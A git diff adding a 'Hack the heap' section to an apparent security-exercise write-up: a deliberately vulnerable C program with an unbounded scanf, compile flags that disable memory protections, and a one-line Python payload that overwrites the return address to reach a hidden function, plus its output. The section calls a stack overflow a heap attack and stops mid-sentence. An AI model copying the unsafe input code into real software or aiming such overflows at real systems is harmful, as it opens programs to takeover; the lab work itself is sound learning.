@@ -333,6 +333,57 @@ Unfortunately qemu stucks into black screen, In fact I suppose that it is due to
 
 ## D - Hack the heap
 
+In order to understand how to hack the heap behaviour with buffer overflow, this part has been realised with [this step-by-step explained tuto](https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/)
+
+### a - code sample
+```c
+#include <stdio.h>
+
+void secretFunction()
+{
+    printf("Congratulations!\n");
+    printf("You have entered in the secret function!\n");
+    printf("Let's find here a Reverse shell .. ie \n");
+}
+
+void echo()
+{
+    char buffer[20];
+    printf("Enter some text:\n");
+    scanf("%s", buffer);
+    printf("You entered: %s\n", buffer);
+}
+
+int main()
+{
+    echo();
+    return 0;
+}
+
+// 
+// 
+// to compile : $ gcc demo-heap.c -o vuln -m32 -fno-stack-protector -z execstack -no-pie
+// exploit heap  = $ python -c 'print "a"*32 + "\x8b\x84\x04\x08"' | ./vuln
+// OUtput
+/*
+    You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��
+    Congratulations!
+    You have entered in the secret function!
+    Let's find here a Reverse shell .. ie
+    Erreur de segmentation
+ */
+
+/*
+ * secretFunction address (hidra) = 0804848b
+ */
+
+```
+> *explanation:*  the goal of this PoC is to execute the hidden function
+
+### b - compile and analyse
+According to [this forum discussion](https://stackoverflow.com/questions/2340259/how-to-turn-off-gcc-compiler-optimization-to-enable-buffer-overflow), we have to compile with additional options to deactivate memory protection and force 32-bit architecture.
+`$ gcc demo-heap.c -o vuln -m32 -fno-stack-protector -z execstack -no-pie`
+Now, thanks to objdump,
 
 ## E - Fuzzing
 Let's reuse the code of the part A (Crack Emily) and design a script to rewrite (one bit a time) the binary in order to get a patched version (ie: OK whatever the input)
